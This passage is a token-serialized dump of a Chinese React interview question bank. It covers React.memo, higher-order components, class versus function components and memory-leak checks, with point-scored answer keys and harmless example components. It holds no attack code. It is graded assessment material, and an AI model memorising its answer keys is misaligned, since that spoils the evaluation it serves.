优点：代码更简洁，性能更好（因为没有类的开销）。\\n\\n","task":false,"loose":true,"text":"优点：代码更简洁，性能更好（因为没有类的开销）。\\n","tokens":[{"type":"text","raw":"优点：代码更简洁，性能更好（因为没有类的开销）。\\n","text":"优点：代码更简洁，性能更好（因为没有类的开销）。","tokens":[{"type":"text","raw":"优点：代码更简洁，性能更好（因为没有类的开销）。","text":"优点：代码更简洁，性能更好（因为没有类的开销）。","escaped":false}]}]},{"type":"list_item","raw":"- 限制：早期版本的函数组件不支持生命周期方法和状态管理，但随着 Hooks 的引入，这些限制已经被解除。\\n\\n","task":false,"loose":true,"text":"限制：早期版本的函数组件不支持生命周期方法和状态管理，但随着 Hooks 的引入，这些限制已经被解除。\\n","tokens":[{"type":"text","raw":"限制：早期版本的函数组件不支持生命周期方法和状态管理，但随着 Hooks 的引入，这些限制已经被解除。\\n","text":"限制：早期版本的函数组件不支持生命周期方法和状态管理，但随着 Hooks 的引入，这些限制已经被解除。","tokens":[{"type":"text","raw":"限制：早期版本的函数组件不支持生命周期方法和状态管理，但随着 Hooks 的引入，这些限制已经被解除。","text":"限制：早期版本的函数组件不支持生命周期方法和状态管理，但随着 Hooks 的引入，这些限制已经被解除。","escaped":false}]}]},{"type":"list_item","raw":"- 类组件：\\n\\n","task":false,"loose":true,"text":"类组件：\\n","tokens":[{"type":"text","raw":"类组件：\\n","text":"类组件：","tokens":[{"type":"text","raw":"类组件：","text":"类组件：","escaped":false}]}]},{"type":"list_item","raw":"- 定义：类组件是继承自 React.Component 的 ES6 类，可以定义生命周期方法和管理状态。\\n\\n","task":false,"loose":true,"text":"定义：类组件是继承自 React.Component 的 ES6 类，可以定义生命周期方法和管理状态。\\n","tokens":[{"type":"text","raw":"定义：类组件是继承自 React.Component 的 ES6 类，可以定义生命周期方法和管理状态。\\n","text":"定义：类组件是继承自 React.Component 的 ES6 类，可以定义生命周期方法和管理状态。","tokens":[{"type":"text","raw":"定义：类组件是继承自 React.Component 的 ES6 类，可以定义生命周期方法和管理状态。","text":"定义：类组件是继承自 React.Component 的 ES6 类，可以定义生命周期方法和管理状态。","escaped":false}]}]},{"type":"list_item","raw":"- 优点：支持生命周期方法和状态管理，功能更强大。\\n\\n","task":false,"loose":true,"text":"优点：支持生命周期方法和状态管理，功能更强大。\\n","tokens":[{"type":"text","raw":"优点：支持生命周期方法和状态管理，功能更强大。\\n","text":"优点：支持生命周期方法和状态管理，功能更强大。","tokens":[{"type":"text","raw":"优点：支持生命周期方法和状态管理，功能更强大。","text":"优点：支持生命周期方法和状态管理，功能更强大。","escaped":false}]}]},{"type":"list_item","raw":"- 缺点：代码相对复杂，性能略逊于函数组件。","task":false,"loose":true,"text":"缺点：代码相对复杂，性能略逊于函数组件。","tokens":[{"type":"text","raw":"缺点：代码相对复杂，性能略逊于函数组件。","text":"缺点：代码相对复杂，性能略逊于函数组件。","tokens":[{"type":"text","raw":"缺点：代码相对复杂，性能略逊于函数组件。","text":"缺点：代码相对复杂，性能略逊于函数组件。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## React.memo 的作用和使用场景\\n\\n","depth":2,"text":"React.memo 的作用和使用场景","tokens":[{"type":"text","raw":"React.memo 的作用和使用场景","text":"React.memo 的作用和使用场景","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **1：** 作用1： 性能优化：React.memo 是一个高阶组件，它通过对组件的 props 进行浅比较来决定组件是否需要重新渲染。如果传入组件的 props 没有发生变化，组\\n件就不会重新渲染；只有当 props 发生变化时，组件才会重新渲染。这有助于减少不必要的渲染操作，提高应用程序的性能。\\n- **1：** 作用2：避免重复渲染：在 React 应用中，当一个组件的父组件重新渲染时，它默认会导致子组件也重新渲染。对于那些只依赖于 props 且计算成本较高的组件，这\\n种默认行为可能会导致性能浪费。React.memo 可以帮助解决这个问题，它可以让组件 “记住” 之前的渲染结果，在 props 不变的情况下跳过重新渲染。\\n- **1：** 使用场景1：纯展示组件。纯展示组件是指那些只根据传入的 props 来展示 UI，没有内部状态变化和副作用（如数据获取、订阅事件等）的组件。例如，一个简单的用户\\n信息展示组件，它接收用户的姓名、年龄等信息作为 props，并将这些信息展示出来。示例：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 作用1： 性能优化：React.memo 是一个高阶组件，它通过对组件的 props 进行浅比较来决定组件是否需要重新渲染。如果传入组件的 props 没有发生变化，组\\n件就不会重新渲染；只有当 props 发生变化时，组件才会重新渲染。这有助于减少不必要的渲染操作，提高应用程序的性能。\\n","task":false,"loose":false,"text":"**1：** 作用1： 性能优化：React.memo 是一个高阶组件，它通过对组件的 props 进行浅比较来决定组件是否需要重新渲染。如果传入组件的 props 没有发生变化，组\\n件就不会重新渲染；只有当 props 发生变化时，组件才会重新渲染。这有助于减少不必要的渲染操作，提高应用程序的性能。","tokens":[{"type":"text","raw":"**1：** 作用1： 性能优化：React.memo 是一个高阶组件，它通过对组件的 props 进行浅比较来决定组件是否需要重新渲染。如果传入组件的 props 没有发生变化，组\\n\\n件就不会重新渲染；只有当 props 发生变化时，组件才会重新渲染。这有助于减少不必要的渲染操作，提高应用程序的性能。","text":"**1：** 作用1： 性能优化：React.memo 是一个高阶组件，它通过对组件的 props 进行浅比较来决定组件是否需要重新渲染。如果传入组件的 props 没有发生变化，组\\n件就不会重新渲染；只有当 props 发生变化时，组件才会重新渲染。这有助于减少不必要的渲染操作，提高应用程序的性能。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 作用1： 性能优化：React.memo 是一个高阶组件，它通过对组件的 props 进行浅比较来决定组件是否需要重新渲染。如果传入组件的 props 没有发生变化，组\\n件就不会重新渲染；只有当 props 发生变化时，组件才会重新渲染。这有助于减少不必要的渲染操作，提高应用程序的性能。","text":" 作用1： 性能优化：React.memo 是一个高阶组件，它通过对组件的 props 进行浅比较来决定组件是否需要重新渲染。如果传入组件的 props 没有发生变化，组\\n件就不会重新渲染；只有当 props 发生变化时，组件才会重新渲染。这有助于减少不必要的渲染操作，提高应用程序的性能。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 作用2：避免重复渲染：在 React 应用中，当一个组件的父组件重新渲染时，它默认会导致子组件也重新渲染。对于那些只依赖于 props 且计算成本较高的组件，这\\n种默认行为可能会导致性能浪费。React.memo 可以帮助解决这个问题，它可以让组件 “记住” 之前的渲染结果，在 props 不变的情况下跳过重新渲染。\\n","task":false,"loose":false,"text":"**1：** 作用2：避免重复渲染：在 React 应用中，当一个组件的父组件重新渲染时，它默认会导致子组件也重新渲染。对于那些只依赖于 props 且计算成本较高的组件，这\\n种默认行为可能会导致性能浪费。React.memo 可以帮助解决这个问题，它可以让组件 “记住” 之前的渲染结果，在 props 不变的情况下跳过重新渲染。","tokens":[{"type":"text","raw":"**1：** 作用2：避免重复渲染：在 React 应用中，当一个组件的父组件重新渲染时，它默认会导致子组件也重新渲染。对于那些只依赖于 props 且计算成本较高的组件，这\\n\\n种默认行为可能会导致性能浪费。React.memo 可以帮助解决这个问题，它可以让组件 “记住” 之前的渲染结果，在 props 不变的情况下跳过重新渲染。","text":"**1：** 作用2：避免重复渲染：在 React 应用中，当一个组件的父组件重新渲染时，它默认会导致子组件也重新渲染。对于那些只依赖于 props 且计算成本较高的组件，这\\n种默认行为可能会导致性能浪费。React.memo 可以帮助解决这个问题，它可以让组件 “记住” 之前的渲染结果，在 props 不变的情况下跳过重新渲染。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 作用2：避免重复渲染：在 React 应用中，当一个组件的父组件重新渲染时，它默认会导致子组件也重新渲染。对于那些只依赖于 props 且计算成本较高的组件，这\\n种默认行为可能会导致性能浪费。React.memo 可以帮助解决这个问题，它可以让组件 “记住” 之前的渲染结果，在 props 不变的情况下跳过重新渲染。","text":" 作用2：避免重复渲染：在 React 应用中，当一个组件的父组件重新渲染时，它默认会导致子组件也重新渲染。对于那些只依赖于 props 且计算成本较高的组件，这\\n种默认行为可能会导致性能浪费。React.memo 可以帮助解决这个问题，它可以让组件 “记住” 之前的渲染结果，在 props 不变的情况下跳过重新渲染。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 使用场景1：纯展示组件。纯展示组件是指那些只根据传入的 props 来展示 UI，没有内部状态变化和副作用（如数据获取、订阅事件等）的组件。例如，一个简单的用户\\n信息展示组件，它接收用户的姓名、年龄等信息作为 props，并将这些信息展示出来。示例：","task":false,"loose":false,"text":"**1：** 使用场景1：纯展示组件。纯展示组件是指那些只根据传入的 props 来展示 UI，没有内部状态变化和副作用（如数据获取、订阅事件等）的组件。例如，一个简单的用户\\n信息展示组件，它接收用户的姓名、年龄等信息作为 props，并将这些信息展示出来。示例：","tokens":[{"type":"text","raw":"**1：** 使用场景1：纯展示组件。纯展示组件是指那些只根据传入的 props 来展示 UI，没有内部状态变化和副作用（如数据获取、订阅事件等）的组件。例如，一个简单的用户\\n\\n信息展示组件，它接收用户的姓名、年龄等信息作为 props，并将这些信息展示出来。示例：","text":"**1：** 使用场景1：纯展示组件。纯展示组件是指那些只根据传入的 props 来展示 UI，没有内部状态变化和副作用（如数据获取、订阅事件等）的组件。例如，一个简单的用户\\n信息展示组件，它接收用户的姓名、年龄等信息作为 props，并将这些信息展示出来。示例：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用场景1：纯展示组件。纯展示组件是指那些只根据传入的 props 来展示 UI，没有内部状态变化和副作用（如数据获取、订阅事件等）的组件。例如，一个简单的用户\\n信息展示组件，它接收用户的姓名、年龄等信息作为 props，并将这些信息展示出来。示例：","text":" 使用场景1：纯展示组件。纯展示组件是指那些只根据传入的 props 来展示 UI，没有内部状态变化和副作用（如数据获取、订阅事件等）的组件。例如，一个简单的用户\\n信息展示组件，它接收用户的姓名、年龄等信息作为 props，并将这些信息展示出来。示例：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nimport React from \'react\';\\nconst UserInfo = ({ name, age }) => (\\n    <div>\\n        <p>Name: {name}</p>\\n        <p>Age: {age}</p>\\n    </div>\\n);\\nexport default React.memo(UserInfo);\\n//在这个例子中，UserInfo 组件是一个纯展示组件。通过使用 React.memo 包裹它，当组件的 name 和 age props 没有变化时，组件就不会重新渲染，从而提高了性能。\\n```","lang":"js","text":"import React from \'react\';\\nconst UserInfo = ({ name, age }) => (\\n    <div>\\n        <p>Name: {name}</p>\\n        <p>Age: {age}</p>\\n    </div>\\n);\\nexport default React.memo(UserInfo);\\n//在这个例子中，UserInfo 组件是一个纯展示组件。通过使用 React.memo 包裹它，当组件的 name 和 age props 没有变化时，组件就不会重新渲染，从而提高了性能。"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 使用场景2：大型组件树中的子组件。在大型的 React 应用中，组件树可能会非常复杂。在这种情况下，一些深层次的子组件可能会因为父组件的重新渲染而频繁地重新渲染，即\\n使这些子组件的 props 并没有实际变化。示例：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 使用场景2：大型组件树中的子组件。在大型的 React 应用中，组件树可能会非常复杂。在这种情况下，一些深层次的子组件可能会因为父组件的重新渲染而频繁地重新渲染，即\\n使这些子组件的 props 并没有实际变化。示例：","task":false,"loose":false,"text":"**1：** 使用场景2：大型组件树中的子组件。在大型的 React 应用中，组件树可能会非常复杂。在这种情况下，一些深层次的子组件可能会因为父组件的重新渲染而频繁地重新渲染，即\\n使这些子组件的 props 并没有实际变化。示例：","tokens":[{"type":"text","raw":"**1：** 使用场景2：大型组件树中的子组件。在大型的 React 应用中，组件树可能会非常复杂。在这种情况下，一些深层次的子组件可能会因为父组件的重新渲染而频繁地重新渲染，即\\n\\n使这些子组件的 props 并没有实际变化。示例：","text":"**1：** 使用场景2：大型组件树中的子组件。在大型的 React 应用中，组件树可能会非常复杂。在这种情况下，一些深层次的子组件可能会因为父组件的重新渲染而频繁地重新渲染，即\\n使这些子组件的 props 并没有实际变化。示例：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用场景2：大型组件树中的子组件。在大型的 React 应用中，组件树可能会非常复杂。在这种情况下，一些深层次的子组件可能会因为父组件的重新渲染而频繁地重新渲染，即\\n使这些子组件的 props 并没有实际变化。示例：","text":" 使用场景2：大型组件树中的子组件。在大型的 React 应用中，组件树可能会非常复杂。在这种情况下，一些深层次的子组件可能会因为父组件的重新渲染而频繁地重新渲染，即\\n使这些子组件的 props 并没有实际变化。示例：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nimport React from \'react\';\\nconst Sidebar = ({ menuData }) => {\\n    // 复杂的菜单渲染逻辑\\n    return (\\n        <div>\\n            {menuData.map((item) => (\\n                <MenuItem key={item.id} item={item} />\\n            ))}\\n        </div>\\n    );\\n};\\nexport default React.memo(Sidebar);\\n//通过使用 React.memo 包裹 Sidebar 组件，当父组件重新渲染但 menuData 没有变化时，Sidebar 组件就不会重新渲染，避免了不必要的渲染开销，提高了整个页面的性能。\\n```","lang":"js","text":"import React from \'react\';\\nconst Sidebar = ({ menuData }) => {\\n    // 复杂的菜单渲染逻辑\\n    return (\\n        <div>\\n            {menuData.map((item) => (\\n                <MenuItem key={item.id} item={item} />\\n            ))}\\n        </div>\\n    );\\n};\\nexport default React.memo(Sidebar);\\n//通过使用 React.memo 包裹 Sidebar 组件，当父组件重新渲染但 menuData 没有变化时，Sidebar 组件就不会重新渲染，避免了不必要的渲染开销，提高了整个页面的性能。"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 使用场景3：在函数式组件中。如果组件的渲染逻辑比较复杂，或者组件在一个频繁更新的环境中（如在一个实时数据更新的仪表盘应用中），使用 React.memo 可以有效减少不\\n必要的渲染。示例：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 使用场景3：在函数式组件中。如果组件的渲染逻辑比较复杂，或者组件在一个频繁更新的环境中（如在一个实时数据更新的仪表盘应用中），使用 React.memo 可以有效减少不\\n必要的渲染。示例：","task":false,"loose":false,"text":"**1：** 使用场景3：在函数式组件中。如果组件的渲染逻辑比较复杂，或者组件在一个频繁更新的环境中（如在一个实时数据更新的仪表盘应用中），使用 React.memo 可以有效减少不\\n必要的渲染。示例：","tokens":[{"type":"text","raw":"**1：** 使用场景3：在函数式组件中。如果组件的渲染逻辑比较复杂，或者组件在一个频繁更新的环境中（如在一个实时数据更新的仪表盘应用中），使用 React.memo 可以有效减少不\\n\\n必要的渲染。示例：","text":"**1：** 使用场景3：在函数式组件中。如果组件的渲染逻辑比较复杂，或者组件在一个频繁更新的环境中（如在一个实时数据更新的仪表盘应用中），使用 React.memo 可以有效减少不\\n必要的渲染。示例：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用场景3：在函数式组件中。如果组件的渲染逻辑比较复杂，或者组件在一个频繁更新的环境中（如在一个实时数据更新的仪表盘应用中），使用 React.memo 可以有效减少不\\n必要的渲染。示例：","text":" 使用场景3：在函数式组件中。如果组件的渲染逻辑比较复杂，或者组件在一个频繁更新的环境中（如在一个实时数据更新的仪表盘应用中），使用 React.memo 可以有效减少不\\n必要的渲染。示例：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nimport React from \'react\';\\nconst RealTimeChart = ({ dataArray, chartType }) => {\\n    // 复杂的图表绘制逻辑，可能涉及到数据处理、坐标轴设置等\\n    return (\\n        <div>\\n            <Chart data={dataArray} type={chartType} />\\n        </div>\\n    );\\n};\\nexport default React.memo(RealTimeChart);\\n//当数据更新时，只有 dataArray 或 chartType 发生变化，RealTimeChart 组件才会重新渲染，否则将使用之前的渲染结果，避免了因其他无关因素导致的重新渲染，提升了性能。\\n```","lang":"js","text":"import React from \'react\';\\nconst RealTimeChart = ({ dataArray, chartType }) => {\\n    // 复杂的图表绘制逻辑，可能涉及到数据处理、坐标轴设置等\\n    return (\\n        <div>\\n            <Chart data={dataArray} type={chartType} />\\n        </div>\\n    );\\n};\\nexport default React.memo(RealTimeChart);\\n//当数据更新时，只有 dataArray 或 chartType 发生变化，RealTimeChart 组件才会重新渲染，否则将使用之前的渲染结果，避免了因其他无关因素导致的重新渲染，提升了性能。"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 什么是 React 中的高阶组件（HOC）？请简单举例说明其用法\\n\\n","depth":2,"text":"什么是 React 中的高阶组件（HOC）？请简单举例说明其用法","tokens":[{"type":"text","raw":"什么是 React 中的高阶组件（HOC）？请简单举例说明其用法","text":"什么是 React 中的高阶组件（HOC）？请简单举例说明其用法","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- **1：** 高阶组件（Higher - Order Component，简称 HOC）是一个函数，它接收一个组件作为参数，并返回一个新的组件。这个新组件通常会增强或修改原始组件\\n的功能、行为或外观。可以把它看作是一种组件的 “工厂函数”，用于创建具有额外功能的组件。\\n- **1：** 用法1：代码复用。HOC 可以将多个组件共有的逻辑提取出来，放到一个地方进行复用。例如，多个组件都需要进行权限验证，就可以创建一个权限验证的 HOC，\\n让这些组件都通过这个 HOC 来获得权限验证功能。\\n- **1：** 用法2：逻辑抽象和分离。可以将一些复杂的、与业务逻辑无关的功能（如数据加载、动画效果等）从组件内部抽象出来，通过 HOC 来处理，使得组件本身更加专\\n注于自己的核心业务逻辑（如展示 UI 和处理用户交互）。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 高阶组件（Higher - Order Component，简称 HOC）是一个函数，它接收一个组件作为参数，并返回一个新的组件。这个新组件通常会增强或修改原始组件\\n的功能、行为或外观。可以把它看作是一种组件的 “工厂函数”，用于创建具有额外功能的组件。\\n","task":false,"loose":false,"text":"**1：** 高阶组件（Higher - Order Component，简称 HOC）是一个函数，它接收一个组件作为参数，并返回一个新的组件。这个新组件通常会增强或修改原始组件\\n的功能、行为或外观。可以把它看作是一种组件的 “工厂函数”，用于创建具有额外功能的组件。","tokens":[{"type":"text","raw":"**1：** 高阶组件（Higher - Order Component，简称 HOC）是一个函数，它接收一个组件作为参数，并返回一个新的组件。这个新组件通常会增强或修改原始组件\\n\\n的功能、行为或外观。可以把它看作是一种组件的 “工厂函数”，用于创建具有额外功能的组件。","text":"**1：** 高阶组件（Higher - Order Component，简称 HOC）是一个函数，它接收一个组件作为参数，并返回一个新的组件。这个新组件通常会增强或修改原始组件\\n的功能、行为或外观。可以把它看作是一种组件的 “工厂函数”，用于创建具有额外功能的组件。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 高阶组件（Higher - Order Component，简称 HOC）是一个函数，它接收一个组件作为参数，并返回一个新的组件。这个新组件通常会增强或修改原始组件\\n的功能、行为或外观。可以把它看作是一种组件的 “工厂函数”，用于创建具有额外功能的组件。","text":" 高阶组件（Higher - Order Component，简称 HOC）是一个函数，它接收一个组件作为参数，并返回一个新的组件。这个新组件通常会增强或修改原始组件\\n的功能、行为或外观。可以把它看作是一种组件的 “工厂函数”，用于创建具有额外功能的组件。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 用法1：代码复用。HOC 可以将多个组件共有的逻辑提取出来，放到一个地方进行复用。例如，多个组件都需要进行权限验证，就可以创建一个权限验证的 HOC，\\n让这些组件都通过这个 HOC 来获得权限验证功能。\\n","task":false,"loose":false,"text":"**1：** 用法1：代码复用。HOC 可以将多个组件共有的逻辑提取出来，放到一个地方进行复用。例如，多个组件都需要进行权限验证，就可以创建一个权限验证的 HOC，\\n让这些组件都通过这个 HOC 来获得权限验证功能。","tokens":[{"type":"text","raw":"**1：** 用法1：代码复用。HOC 可以将多个组件共有的逻辑提取出来，放到一个地方进行复用。例如，多个组件都需要进行权限验证，就可以创建一个权限验证的 HOC，\\n\\n让这些组件都通过这个 HOC 来获得权限验证功能。","text":"**1：** 用法1：代码复用。HOC 可以将多个组件共有的逻辑提取出来，放到一个地方进行复用。例如，多个组件都需要进行权限验证，就可以创建一个权限验证的 HOC，\\n让这些组件都通过这个 HOC 来获得权限验证功能。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 用法1：代码复用。HOC 可以将多个组件共有的逻辑提取出来，放到一个地方进行复用。例如，多个组件都需要进行权限验证，就可以创建一个权限验证的 HOC，\\n让这些组件都通过这个 HOC 来获得权限验证功能。","text":" 用法1：代码复用。HOC 可以将多个组件共有的逻辑提取出来，放到一个地方进行复用。例如，多个组件都需要进行权限验证，就可以创建一个权限验证的 HOC，\\n让这些组件都通过这个 HOC 来获得权限验证功能。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 用法2：逻辑抽象和分离。可以将一些复杂的、与业务逻辑无关的功能（如数据加载、动画效果等）从组件内部抽象出来，通过 HOC 来处理，使得组件本身更加专\\n注于自己的核心业务逻辑（如展示 UI 和处理用户交互）。","task":false,"loose":false,"text":"**1：** 用法2：逻辑抽象和分离。可以将一些复杂的、与业务逻辑无关的功能（如数据加载、动画效果等）从组件内部抽象出来，通过 HOC 来处理，使得组件本身更加专\\n注于自己的核心业务逻辑（如展示 UI 和处理用户交互）。","tokens":[{"type":"text","raw":"**1：** 用法2：逻辑抽象和分离。可以将一些复杂的、与业务逻辑无关的功能（如数据加载、动画效果等）从组件内部抽象出来，通过 HOC 来处理，使得组件本身更加专\\n\\n注于自己的核心业务逻辑（如展示 UI 和处理用户交互）。","text":"**1：** 用法2：逻辑抽象和分离。可以将一些复杂的、与业务逻辑无关的功能（如数据加载、动画效果等）从组件内部抽象出来，通过 HOC 来处理，使得组件本身更加专\\n注于自己的核心业务逻辑（如展示 UI 和处理用户交互）。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 用法2：逻辑抽象和分离。可以将一些复杂的、与业务逻辑无关的功能（如数据加载、动画效果等）从组件内部抽象出来，通过 HOC 来处理，使得组件本身更加专\\n注于自己的核心业务逻辑（如展示 UI 和处理用户交互）。","text":" 用法2：逻辑抽象和分离。可以将一些复杂的、与业务逻辑无关的功能（如数据加载、动画效果等）从组件内部抽象出来，通过 HOC 来处理，使得组件本身更加专\\n注于自己的核心业务逻辑（如展示 UI 和处理用户交互）。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 什如何在 React 应用中进行有效的内存泄漏排查和修复？\\n\\n","depth":2,"text":"什如何在 React 应用中进行有效的内存泄漏排查和修复？","tokens":[{"type":"text","raw":"什如何在 React 应用中进行有效的内存泄漏排查和修复？","text":"什如何在 React 应用中进行有效的内存泄漏排查和修复？","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- **1：** 使用 Chrome 开发者工具的 Memory 面板进行内存快照分析，查找未被释放的对象；\\n- **1：** 检查组件卸载时是否取消了订阅、定时器、事件监听器等可能导致内存泄漏的源头；\\n- **1：** 对于使用了第三方库的情况，要确保库的使用方式正确，避免因库的不当使用造成内存泄漏。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 使用 Chrome 开发者工具的 Memory 面板进行内存快照分析，查找未被释放的对象；\\n","task":false,"loose":false,"text":"**1：** 使用 Chrome 开发者工具的 Memory 面板进行内存快照分析，查找未被释放的对象；","tokens":[{"type":"text","raw":"**1：** 使用 Chrome 开发者工具的 Memory 面板进行内存快照分析，查找未被释放的对象；","text":"**1：** 使用 Chrome 开发者工具的 Memory 面板进行内存快照分析，查找未被释放的对象；","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用 Chrome 开发者工具的 Memory 面板进行内存快照分析，查找未被释放的对象；","text":" 使用 Chrome 开发者工具的 Memory 面板进行内存快照分析，查找未被释放的对象；","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 检查组件卸载时是否取消了订阅、定时器、事件监听器等可能导致内存泄漏的源头；\\n","task":false,"loose":false,"text":"**1：** 检查组件卸载时是否取消了订阅、定时器、事件监听器等可能导致内存泄漏的源头；","tokens":[{"type":"text","raw":"**1：** 检查组件卸载时是否取消了订阅、定时器、事件监听器等可能导致内存泄漏的源头；","text":"**1：** 检查组件卸载时是否取消了订阅、定时器、事件监听器等可能导致内存泄漏的源头；","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 检查组件卸载时是否取消了订阅、定时器、事件监听器等可能导致内存泄漏的源头；","text":" 检查组件卸载时是否取消了订阅、定时器、事件监听器等可能导致内存泄漏的源头；","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 对于使用了第三方库的情况，要确保库的使用方式正确，避免因库的不当使用造成内存泄漏。","task":false,"loose":false,"text":"**1：** 对于使用了第三方库的情况，要确保库的使用方式正确，避免因库的不当使用造成内存泄漏。","tokens":[{"type":"text","raw":"**1：** 对于使用了第三方库的情况，要确保库的使用方式正确，避免因库的不当使用造成内存泄漏。","text":"**1：** 对于使用了第三方库的情况，要确保库的使用方式正确，避免因库的不当使用造成内存泄漏。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 对于使用了第三方库的情况，要确保库的使用方式正确，避免因库的不当使用造成内存泄漏。","text":" 对于使用了第三方库的情况，要确保库的使用方式正确，避免因库的不当使用造成内存泄漏。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 